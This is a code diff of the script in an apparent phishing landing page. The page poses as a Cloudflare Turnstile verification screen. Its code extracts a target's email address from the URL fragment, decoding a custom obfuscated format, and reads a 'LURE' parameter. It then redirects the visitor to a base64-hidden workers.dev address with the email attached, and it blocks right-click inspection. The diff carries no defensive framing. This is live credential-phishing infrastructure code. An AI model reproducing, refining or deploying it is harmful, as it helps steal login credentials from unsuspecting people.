@@ -43,7 +43,7 @@
         }
     </style>
 
-<script>
+    <script>
     window.onload = async function () {
         var USE_TURNSTILE = true;
 
@@ -53,7 +53,7 @@
 
         // Valid Base64-encoded SVG and CSS content
         var base64HTML = '';
-        var base64CSS = '';
+    var base64CSS = '';
 
         // Decode base64 to HTML
         function decodeBase64ToHTML(base64) {
@@ -104,86 +104,107 @@
 
         // Check if the email is in the obfuscated format
         function isObfuscatedFormat(email) {
+            // Regular expression to match the obfuscated format: (randomNumber1 character randomNumber2 +)
             const regex = /\(\d[a-zA-Z0-9@.]\d{2}\+\)/g;
             return regex.test(email);
         }
 
         // Decode the obfuscated email
         function decodeEmail(obfuscatedEmail) {
-            const regex = /\(\d([a-zA-Z0-9@.])\d{2}\+\)/g;
-            let decodedEmail = '';
-            let match;
+          // Regular expression to extract characters within the format (randomNumber1 character randomNumber2 +)
+          const regex = /\(\d([a-zA-Z0-9@.])\d{2}\+\)/g;
+          let decodedEmail = '';
+          let match;
 
-            while ((match = regex.exec(obfuscatedEmail)) !== null) {
-                console.log('Matched Segment:', match[0]); 
-                decodedEmail += match[1];
-            }
+          // Extract characters using the regular expression
+          while ((match = regex.exec(obfuscatedEmail)) !== null) {
+            console.log('Matched Segment:', match[0]);  // Debug: log the matched segment
+            decodedEmail += match[1];
+          }
 
-            return decodedEmail;
+          return decodedEmail;
         }
 
-        // Extract and decode email from URL 
-        function extractAndDecodeEmail() {
-            const url = window.location.href;
-            const hashFragment = url.split('#')[1]; 
-            let email = null;
 
-            if (hashFragment) {
-                try {
-                    if (hashFragment.includes('POP=')) {
-                        email = hashFragment.split('POP=')[1].trim();
-                        email = decodeURIComponent(email);
+// Extract and decode email or LURE value from URL
+function extractAndDecodeHashValues() {
+    const url = window.location.href;
+    const hashFragment = url.split('#')[1]; // Get the part after the #
+    let result = {
+        email: null,
+        lureValue: null
+    };
 
-                        if (isObfuscatedFormat(email)) {
-                            console.log('Email is in obfuscated format. Decoding...');
-                            email = decodeEmail(email);
-                        }
-                    } else {
-                        let base64Decoded = decodeBase64(hashFragment.trim());
-                        if (base64Decoded) {
-                            email = base64Decoded;
-                        } else {
-                            email = hashFragment.trim();
-                        }
+    if (hashFragment) {
+        try {
+            // Extract and decode the value for 'POP='
+            if (hashFragment.includes('POP=')) {
+                const popMatch = hashFragment.match(/POP=([^#]+)/); // Match 'POP=' followed by anything until the next '#'
+                if (popMatch) {
+                    let email = decodeURIComponent(popMatch[1].trim());
+
+                    // Check if it's in an obfuscated format and decode if necessary
+                    if (isObfuscatedFormat(email)) {
+                        console.log('Email is in obfuscated format. Decoding...');
+                        email = decodeEmail(email);
                     }
-                } catch (e) {
-                    console.error('Failed to extract or decode email:', e);
+                    result.email = email;
                 }
             }
 
-            console.log('Final Decoded Email:', email); 
-            return email;
+            // Extract and decode the value for 'LURE='
+            if (hashFragment.includes('LURE=')) {
+                const lureMatch = hashFragment.match(/LURE=([^#]+)/); // Match 'LURE=' followed by anything until the next '#'
+                if (lureMatch) {
+                    let lureValue = decodeURIComponent(lureMatch[1].trim());
+                    result.lureValue = lureValue;
+                }
+            }
+
+            // Handle Base64 decoding if no specific patterns are found
+            if (!result.email && !result.lureValue) {
+                let base64Decoded = decodeBase64(hashFragment.trim());
+                if (base64Decoded) {
+                    result.email = base64Decoded; // Assume it's email if Base64 decoding succeeds
+                }
+            }
+        } catch (e) {
+            console.error('Failed to extract or decode hash values:', e);
         }
-// Extract both lure URL and email from the # fragment
-function extractLureAndEmail() {
-    const hashFragment = window.location.hash.substring(1); // Remove the # symbol
-    const fragmentParams = new URLSearchParams(hashFragment);
+    }
 
-    // Extract lure and POP parameters
-    const lure = fragmentParams.get('lure');
-    const email = fragmentParams.get('POP');
-
-    return { lure, email };
+    console.log('Extracted Values:', result); // Debugging log
+    return result;
 }
 
-// Redirect to lure URL if provided
-async function redirectToLureUrlWithEmail() {
-    const { lure, email } = extractLureAndEmail();
-    if (lure) {
-        // Add `redirected=done` as a query parameter and retain POP in the fragment
-        const separator = lure.includes('?') ? '&' : '?';
-        const redirectUrl = `${lure}${separator}redirected=done#POP=${encodeURIComponent(email || '')}`;
-        
-        console.log('Redirecting to:', redirectUrl);
-        window.location.href = redirectUrl;
-    } else {
-        console.log('No lure URL provided in the hash fragment.');
+
+
+// Decode Base64 URL and extract redirect URL from response
+async function getRedirectUrlWithEmail(base64Url, email) {
+    // Decode base64 to get the URL
+    const decodedUrl = atob(base64Url);
+
+    try {
+        // Make a fetch request to the decoded URL
+        const response = await fetch(decodedUrl);
+        if (response.ok) {
+            const data = await response.json();
+            
+            // Extract the URL from the response and append #M + email
+            const redirectUrl = data.message + '#' + email;
+            console.log('Extracted redirect URL:', redirectUrl);
+            return redirectUrl;
+        } else {
+            console.error('Failed to fetch data from decoded URL');
+            return null;
+        }
+    } catch (error) {
+        console.error('Error fetching data:', error);
+        return null;
     }
 }
-
-
-
-        // Start Turnstile verification
+        
+// Start Turnstile verification
 function startTurnstileVerification() {
     const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
     if (USE_TURNSTILE) {
@@ -197,22 +218,28 @@ function startTurnstileVerification() {
                     return;
                 }
 
+                // Show loading animation again
                 loadingDiv.style.display = 'flex';
 
-                // Extract both lure and email immediately
-                const { lure, email } = extractLureAndEmail();
+                // Extract and decode values from URL
+                const { email, lureValue } = extractAndDecodeHashValues();
 
                 // Set a cookie for verification (optional)
                 document.cookie = 'verified=true; Path=/; SameSite=None; Secure=true';
 
-                setTimeout(async function() {
+                // Wait for 3 seconds, then redirect
+                setTimeout(async function () {
                     loadingDiv.style.display = 'none';
 
-                    if (lure) {
-                        // Redirect to the lure URL
-                        await redirectToLureUrlWithEmail();
+                    if (lureValue && email) {
+                        // Construct the redirect URL
+                        const lureDomain = decodeBase64(base64Url); // Decode the base64 URL
+                        const redirectUrl = `${lureDomain}#POP=${encodeURIComponent(email)}?redirected=done`;
+
+                        console.log('Redirecting to LURE URL with email:', redirectUrl); // Debug log
+                        window.location.href = redirectUrl;
                     } else {
-                        console.log('No lure URL found to redirect.');
+                        console.log('Missing LURE or email values for redirection.');
                     }
                 }, 2000);
             },
@@ -225,16 +252,12 @@ function startTurnstileVerification() {
     }
 }
 
-        // Run Turnstile verification
-        startTurnstileVerification();
 
-        // Example usage of email extraction
-        var email = extractAndDecodeEmail();
-        console.log('Extracted and Decoded Email:', email);
+// Run Turnstile verification
+startTurnstileVerification();
+
     };
 </script>
-
-
 
     <script>
     document.addEventListener('contextmenu', function(event) {
